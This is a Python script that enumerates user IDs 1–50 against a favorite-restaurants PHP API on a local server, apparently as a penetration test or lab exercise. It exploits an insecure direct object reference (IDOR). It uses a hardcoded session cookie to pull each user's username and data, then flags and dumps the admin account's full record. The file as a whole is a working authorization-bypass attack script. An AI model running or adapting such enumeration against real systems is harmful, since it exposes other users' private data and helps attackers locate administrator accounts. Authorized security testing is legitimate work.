import requests
import json

def test_user_ids():
    base_url = "http://127.0.0.1:32825/api/get_favorite_restaurants.php"
    
    # Use session cookie from auth state
    cookies = {
        'PHPSESSID': 'hk4mi61pda6ge5d66s5qjhkil3'
    }
    
    valid_users = []
    users_with_data = []
    users_without_data = []
    not_found_users = []
    error_users = []
    admin_user = None
    
    print(f"[IDOR Enumeration] Testing user IDs 1-50 against {base_url}")
    print()
    
    for user_id in range(1, 51):
        url = f"{base_url}?userId={user_id}"
        
        try:
            response = requests.get(url, cookies=cookies, timeout=10)
            
            # Check for HTTP 200 with JSON data
            if response.status_code == 200:
                try:
                    json_data = response.json()
                    valid_users.append(user_id)
                    
                    username = json_data.get('username', 'N/A')
                    restaurants = json_data.get('restaurants', [])
                    
                    # Capture admin user (userId=7)
                    if user_id == 7:
                        admin_user = {
                            'user_id': user_id,
                            'username': username,
                            'restaurant_count': len(restaurants),
                            'full_data': json_data
                        }
                    
                    # Categorize users
                    if restaurants and len(restaurants) > 0:
                        users_with_data.append(user_id)
                    else:
                        users_without_data.append(user_id)
                    
                    # Print success details
                    print(f"[SUCCESS] User ID: {user_id}")
                    print(f"  Username: {username}")
                    print(f"  Restaurants: {len(restaurants)}")
                    print(f"  Status: {response.status_code}")
                    print(f"  Response: {json.dumps(json_data)}")
                    print()
                    
                except json.JSONDecodeError:
                    error_users.append(user_id)
                    print(f"[ERROR PAGE] User ID: {user_id}")
                    print(f"  Status: {response.status_code}")
                    print(f"  Response (not JSON): {response.text[:200]}")
                    print()
                    
            elif response.status_code == 404:
                not_found_users.append(user_id)
            else:
                error_users.append(user_id)
                print(f"[UNEXPECTED] User ID: {user_id}")
                print(f"  Status: {response.status_code}")
                print(f"  Response: {response.text[:200]}")
                print()
                
        except requests.exceptions.RequestException as e:
            error_users.append(user_id)
            print(f"[REQUEST ERROR] User ID: {user_id} - {str(e)}")
            print()
    
    # Grouped failure summary
    if not_found_users:
        print(f"[NOT FOUND] Users {not_found_users} - HTTP 404 (don't exist)")
        print()
    
    if error_users:
        print(f"[ERRORS] Users {error_users} - unexpected responses/errors")
        print()
    
    # Overall summary
    print("="*80)
    print("[FINAL SUMMARY]")
    print("="*80)
    print(f"Total valid users found: {len(valid_users)}")
    print(f"  Users with restaurant data: {len(users_with_data)}")
    print(f"  Users without restaurant data: {len(users_without_data)}")
    print(f"Users not found (404): {len(not_found_users)}")
    print(f"Users with errors: {len(error_users)}")
    print()
    
    # Admin confirmation
    if admin_user:
        print(f"[ADMIN CONFIRMED] User ID 7 = admin")
        print(f"  Username: '{admin_user['username']}'")
        print(f"  Restaurant count: {admin_user['restaurant_count']}")
        print(f"  Full data: {json.dumps(admin_user['full_data'], indent=2)}")
        print()
    else:
        print("[ADMIN NOT FOUND] User ID 7 does not exist or returned error")
        print()
    
    # Detailed user list
    print("Valid user breakdown:")
    for uid in sorted(valid_users):
        status = "data" if uid in users_with_data else "no data"
        admin_marker = " [ADMIN]" if uid == 7 else ""
        print(f"  {uid}: {status}{admin_marker}")
    print()
    
    if not_found_users:
        print(f"[DOES NOT EXIST] User IDs: {sorted(not_found_users)}")
        print()
    
    print("="*80)

if __name__ == "__main__":
    test_user_ids()
